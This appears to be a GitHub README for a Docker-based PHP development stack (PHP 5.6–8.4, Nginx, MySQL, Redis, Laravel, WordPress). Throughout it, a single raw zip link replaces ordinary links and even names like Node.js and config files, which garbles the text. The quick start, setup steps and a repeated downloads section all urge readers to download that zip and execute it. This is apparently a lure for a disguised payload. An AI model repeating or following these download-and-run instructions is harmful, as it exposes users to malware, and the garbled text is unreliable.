https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip

# Docker PHP Dev Stack: PHP 5.6–8.4 for Laravel & WordPress

![Releases](https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip)
![Dockerized](https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip)

A Docker-based development environment for any PHP project. It covers PHP 5.6 through 8.4 and stacks like Laravel, Symfony, WordPress. It includes Nginx, MySQL, PostgreSQL, Redis, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip, and Supervisor. Built for WSL2, Linux, and macOS. This README explains how to use the stack, tailor it to your project, and keep your workflow smooth.

Images and assets in this repository reflect the core components of a modern PHP development stack. You’ll see logos and visuals from trusted sources in the wild, such as PHP's own logo for PHP components and Nginx or MySQL logos for related services. Use of visuals is for quick recognition and to help you orient yourself as you work with the stack.

Table of contents
- Quick start
- What you get
- Architecture overview
- Getting started with Docker and Make
- How to customize for your PHP project
- Service-by-service guide
- PHP versions and framework presets
- Working with Laravel
- Working with Symfony
- Working with WordPress
- Asset tooling: Vite and Webpack
- Data persistence and backups
- Networking and hostnames
- Environment and configuration
- Security notes
- Common tasks and recommended workflows
- Troubleshooting
- Contributing
- License

Quick start

- Start point
  - This project provides a Docker-based dev environment for PHP projects across PHP 5.6–8.4. It includes popular frameworks and CMS options, plus the essential services a modern PHP app needs.
  - Where to begin: download the release asset from the Releases page, then run the installer script or follow the quick setup steps described here. From the Releases page, download the release asset and execute it. The first line of this README links you to the same resource: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip

- Prerequisites you should have installed
  - Docker Engine and Docker Compose
  - A modern shell (bash, zsh) on Linux, macOS, or Windows with WSL2
  - Git for cloning or updating the repository
  - Basic command line familiarity for container workflows

- Quick install path
  - Download the latest release asset from the Releases page and run it
  - If you prefer to work with the repo directly, clone it and use the built-in Makefile targets to spin up the environment
  - After installation, you can bring the stack up with a single command and start developing immediately

- Quick start commands (typical flow)
  - Bring the stack up: make up
  - Bring the stack down: make down
  - Show logs: make logs
  - Run a PHP CLI in the container: make php
  - Open a shell in a container: make shell
  - Regenerate assets or install dependencies: make init
  - Restart services: make restart

What you get

- A cohesive dev environment for PHP projects
  - PHP versions spanning 5.6 to 8.4
  - Web server: Nginx
  - Databases: MySQL and PostgreSQL
  - Cache and data store: Redis
  - Frontend tooling: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip with Vite and Webpack
  - Process supervisor: Supervisor for managing long-running daemons
  - Local development parity: Linux, macOS, and WSL2 compatibility

- Real-world project templates
  - Laravel-ready workspace with optional presets
  - Symfony-friendly setup
  - WordPress-focused workflow with Composer and WP-CLI
  - Clean separation of services to mirror production practices

- A simple, scalable approach
  - Everything runs in containers
  - Data persists via Docker volumes
  - Docker Compose orchestrates the full stack
  - Makefile provides a friendly, repeatable interface

- Extensibility
  - Add your own services or tweak existing ones
  - Swap PHP versions with minimal edits
  - Integrate with your existing Docker images or CI pipelines

Architecture overview

- Core services
  - Nginx: handles HTTP requests and serves static assets, proxies to PHP-FPM
  - PHP-FPM: multiple PHP versions available; runs application code
  - MySQL: relational database for apps requiring strong transactions
  - PostgreSQL: alternative relational database with features like advanced indexing
  - Redis: in-memory data store for caching, sessions, queues
  - https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip JavaScript runtime for asset building and tooling
  - Supervisor: manages background processes and ensures uptime

- Supporting pieces
  - Composer: PHP package manager
  - WP-CLI: WordPress command-line tools
  - Artisan (Laravel) / Symfony Console: framework CLIs
  - Vite and Webpack: modern asset pipelines
  - Health checks and basic monitoring hooks to help you spot issues quickly

- Environment parity notes
  - The containers run in isolation but share volumes with the host
  - Networking is typically on a private bridge network; hostnames are stable for development
  - Staging-like environments can be emulated by swapping environment variables

Getting started with Docker and Make

- Repository layout and what to expect
  - https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip main orchestrator for all services
  - Dockerfiles: per-service images or config for PHP, Nginx, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip, and databases
  - makefile: a user-friendly entry point for common tasks
  - templates and env files: example configurations you can copy and customize
  - scripts: helper scripts for bootstrapping, seeding, and maintenance

- Prerequisites check
  - Ensure Docker can run without elevated privileges, or with your standard user setup
  - Ensure your system has at least a couple of GB of free disk space for images and volumes
  - Confirm the host has network connectivity to pull images from Docker Hub or other registries

- First-time setup steps
  - Download the release asset from the Releases page and execute it
  - If using the repo directly, clone it and navigate to the project root
  - Copy example env files if present (for example, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip)
  - Run the stack with the Makefile target to boot all services

- Running the stack
  - Start: make up
  - Stop: make down
  - View logs: make logs
  - Rebuild images after changes: make rebuild
  - Access the PHP app on localhost via the configured port (commonly http://localhost or http://127.0.0.1 depending on your OS)

- Access URLs you’ll likely use
  - Web app: http://localhost (or a configured host)
  - PHP info pages if you add them: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
  - PHPMyAdmin or database UI (if you enable): http://localhost:8080 or similar
  - Node tooling interface (if you enable): http://localhost:3000 or similar

How to customize for your PHP project

- Pick a PHP version
  - The stack ships PHP 5.6 through 8.4
  - You can switch between versions by editing the https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip and per-service Dockerfiles or by using a version selector in your environment
  - When switching, ensure compatibility with your framework and dependencies

- Choose a framework preset
  - Laravel: include Laravel-specific tooling and a ready-to-use directory structure
  - Symfony: come with Symfony’s standard conventions and bin/console
  - WordPress: prepped with WP-CLI and composer-based plugin/theme development workflows

- Add project-specific services
  - If you need a search service, you can bring in Elasticsearch or MeiliSearch
  - If you require a message broker, you can add RabbitMQ or a simple queue mock
  - You can also add an additional Redis database for queue workers separate from the cache

- Environment variables and secrets
  - Store environment-specific values in a .env file or pass them through Makefile targets
  - Do not commit secrets to version control
  - Use a dedicated vault or encryption for production-like secrets when needed

- Volume management
  - PHP code and vendor dependencies live in a code volume
  - Database data lives in dedicated data volumes
  - Static assets (compiled with https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip tooling) can be kept separate
  - Backups: create scripts to snapshot volumes or dump data regularly

Service-by-service guide

- Nginx
  - Purpose: HTTP gateway, reverse proxy, static asset serving
  - Common config: enable fastcgi_pass to PHP-FPM, proxy to assets, set appropriate headers
  - Tips: keep TLS off in local dev unless you’re testing TLS locally; use local certificates if needed

- PHP-FPM
  - Purpose: Run PHP code for your app
  - Versions: 5.6–8.4 available
  - Tips: align PHP extensions with your app requirements; enable opcache for performance in dev with caution

- MySQL
  - Purpose: Relational data store, ACID compliance
  - Tips: set a sane root password, create a dedicated database per project, map a persistent volume for data
  - Backups: use mysqldump via a script or schedule periodic dumps

- PostgreSQL
  - Purpose: Alternative relational DB with advanced features
  - Tips: enable appropriate extensions if your app uses them (e.g., PostGIS, UUID)
  - Backups: pg_dump or pg_dumpall

- Redis
  - Purpose: Cache, session storage, and queues
  - Tips: use a dedicated Redis database for each project if needed; tune memory and eviction policy for your dev needs

- https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip and asset tooling
  - Purpose: Build and bundle frontend assets (Vite, Webpack)
  - Tips: mount your project’s assets as a volume; run npm/yarn/pnpm scripts inside the container to keep parity

- Supervisor
  - Purpose: Manage long-running background processes
  - Use cases: queue workers, cron tasks, or background jobs in dev
  - Tips: configure program entries to ensure proper restart on failure

- WordPress specifics
  - WP-CLI integration allows you to install, update, and manage WordPress from the command line
  - Composer-based workflows can help manage plugins and themes as dependencies

- Laravel specifics
  - Artisan commands run inside PHP-FPM container or a dedicated CLI container
  - Environment files (.env) control the app’s behavior; keep them aligned with the dev stack

- Symfony specifics
  - Console commands via bin/console
  - Asset management with Webpack Encore or Vite depending on project

- Asset tooling (Vite, Webpack)
  - Use a dedicated npm/yarn/pnpm container for building assets
  - Serve assets from a hot-reload server in development if you configure it that way

PHP versions and framework presets

- PHP 5.6
  - Legacy support for older apps; consider upgrading when possible
  - Use older frameworks compatible with PHP 5.6
  - Be mindful of security if you maintain legacy projects

- PHP 7.x
  - A good balance of features and performance for many modern apps
  - Suitable for Laravel 5.x/6.x and Symfony 4.x
  - Ensure compatibility of dependencies

- PHP 8.x (8.0–8.4)
  - Modern syntax, performance improvements
  - Preferred for new projects and updated stacks
  - Take care with outdated extensions or libraries that lack PHP 8 support

Working with Laravel

- Project setup
  - Install dependencies with Composer
  - Set APP_ENV and APP_DEBUG in the environment
  - Configure database settings to match the containerized services
  - Run migrations with artisan migrate

- Local server workflow
  - Serve the app via Nginx in the container
  - Use the built-in queue workers if you need background tasks
  - Build frontend assets with your chosen tooling

- Common tasks
  - composer install
  - php artisan migrate
  - php artisan serve (in a development micro-container if you prefer)

Working with Symfony

- Project setup
  - Install dependencies with Composer
  - Configure Doctrine and database connections
  - Run Symfony console commands for migrations or cache warmups

- Frontend and assets
  - Integrate your asset pipeline with Webpack Encore or Vite
  - Ensure the correct base path for assets in your dev environment

Working with WordPress

- Project setup
  - Install WordPress core, themes, and plugins via WP-CLI or Composer
  - Configure https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip to point to the correct database in the dev environment
  - Use WP-CLI to manage plugins and themes from the command line

- Local development loop
  - Access the WordPress site at the container’s mapped port
  - Use WP-CLI for upgrades, plugin installs, and database operations

Asset tooling: Vite and Webpack

- Vite
  - Lightweight dev server for modern front-end tooling
  - Benefits: fast HMR, quick iteration on UI changes
  - How to run: install dependencies inside the container, start the Vite dev server, and configure proxies if needed

- Webpack
  - Traditional asset bundling approach
  - Use Webpack Dev Server for hot reloads in development
  - Ensure the dev server serves assets correctly through Nginx or a dedicated port

Data persistence and backups

- Data volumes
  - Each service with persistent data uses Docker volumes
  - Data persists across container restarts
  - When deleting stacks, consider backing up volumes if you need to preserve data

- Backups
  - Create regular backups for MySQL and PostgreSQL
  - Use mysqldump and pg_dump to export schema and data
  - Automate backups with a cron script inside a container or on the host

- Restoring data
  - Use the corresponding import utilities to restore from backups
  - Validate data integrity after restore

Networking and hostnames

- Service networking
  - Services communicate over a private Docker network
  - Hostnames typically resolve to container endpoints within the stack
  - You can customize hostnames in your https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip if needed

- Access from the host
  - Map container ports to host ports for web and admin interfaces
  - Use localhost or 127.0.0.1 plus the port you mapped
  - For macOS and Windows, ensure Docker Desktop’s port forwarding is configured correctly

Environment and configuration

- Environment file strategy
  - Use a .env file to define environment variables for local development
  - Keep sensitive values out of version control
  - Use a separate https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip or https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip for each project to avoid cross-project leakage

- Example environment variables you might configure
  - APP_ENV, APP_DEBUG
  - DB_HOST, DB_PORT, DB_NAME, DB_USER, DB_PASSWORD
  - DB_TYPE (mysql or postgres)
  - REDIS_HOST, REDIS_PORT
  - VITE_DEV_SERVER_URL or ASSET_BASE_URL
  - NGINX_HOST, NGINX_PORT

- Docker Compose overrides
  - Use https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip to customize per-project needs
  - Override service definitions (ports, volumes, environment) without editing the base file

Security notes

- Local dev considerations
  - Do not expose the dev stack to the outside world by default
  - Use strong passwords for database users
  - Keep the stack up to date with security patches in the container images
  - Limit container privileges; avoid running containers as root where possible

- Secrets handling
  - Store secrets outside the repository
  - Use environment variables in a controlled manner or a secret management tool for more complex setups

Common tasks and recommended workflows

- Typical development cycle
  - Start the stack with make up
  - Open your code editor and work on PHP, front-end, or configuration
  - Use Artisan, Symfony Console, or WP-CLI to manage your app
  - Build frontend assets with Vite or Webpack as you change UI
  - Use make logs to monitor service output

- Migrations and seeds
  - Use framework-specific commands to migrate the database
  - Seed with your preferred strategy for initial data
  - Verify data integrity in a local environment before pushing changes

- Dependency management
  - Use Composer for PHP dependencies
  - Use npm/yarn/pnpm for JavaScript dependencies
  - Keep dependencies scoped to the project to avoid drift

Troubleshooting

- Common issues and fixes
  - Containers fail to start: check logs with make logs; confirm port availability on the host
  - PHP version mismatch: ensure you’ve selected the right PHP version in the configuration
  - Database connection errors: verify DB host/port, credentials, and that the DB service is up
  - Asset build failures: check https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip version, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip, and the exact build error in the logs
  - Permission problems: ensure correct file ownership for code and volumes

- Diagnostic steps
  - Run docker ps to confirm containers are up
  - Inspect container logs with docker logs or make logs
  - Inspect network settings with docker network inspect
  - Validate that environment variables are loaded as expected

- When to seek help
  - If issues persist after reading the Troubleshooting guide, reach out via the project’s contributing channels or the Issues page on GitHub

Contributing

- How to contribute
  - Open issues for feature requests or bug reports
  - Propose enhancements via a well-scoped pull request
  - Ensure tests pass and that changes don’t break other workflows
  - Document any breaking changes and update the README accordingly

- Code quality and standards
  - Follow the existing project style
  - Provide clear commit messages
  - Include tests or documentation where appropriate

- Documentation and examples
  - Extend the README with real-world use cases
  - Provide example configurations for new frameworks or tooling
  - Share reproducible steps to reproduce issues

- Licensing and attribution
  - Respect licenses of included components
  - Acknowledge upstream sources where required

License

- This project uses an open license suitable for development work. Review the LICENSE file in the repository for full terms and conditions.

Releases and downloads

- Where to download
  - The primary source for official assets is the Releases page linked at the top. For convenience, you’ll find a button-style entry that points to the same resource. Review the assets there to choose the correct installer or container image for your environment.
  - The dedicated Releases page provides assets you should download and execute to install or upgrade the stack: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip

- How to proceed from the Releases page
  - Locate the asset labeled for your platform and PHP version
  - Download the file
  - Run or execute the file following the instructions provided on the page
  - If you run into issues, check the “Releases” section of the repository for any notes or updated guidance

Appendix: quick references and tips

- Short command references
  - Start the stack: make up
  - Stop the stack: make down
  - View logs: make logs
  - Run PHP inside the PHP container: make php
  - Open a shell inside a container: make shell
  - Rebuild images after changes: make rebuild
  - Restart services: make restart

- Environment tips
  - Use a dedicated .env file per project to keep credentials separate
  - Use a versioned lockfile for Node tooling to maintain consistent builds
  - Keep your local machine in sync with the stack’s expectations to avoid subtle config drift

- Quick project templates
  - Laravel: basic routes, a sample controller, and an example migration
  - Symfony: a standard route with a small controller plus a migration script
  - WordPress: a starter theme and a few plugins scaffolded for quick development

- Visuals and branding notes
  - The repository includes emoji accents and visual cues to help you navigate sections
  - Where possible, images from established sources help identify services (PHP logo for PHP, nginx logo for Nginx, etc.)
  - The goal is to make the README readable and scannable while preserving technical depth

- Final reminders
  - The first line of this document is the Releases link used for downloads
  - The stack is designed to be safe for local development on multiple platforms
  - The Makefile interface provides a friendly workflow for routine tasks
  - Stay mindful of security practices even in a local dev environment

Releases and downloads (repeat)

- For quick access, the Releases page is also linked here: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
- From this page, download the appropriate asset for your environment and execute it to initialize or upgrade the stack. If you encounter issues, revisit the Releases section for notes and troubleshooting steps.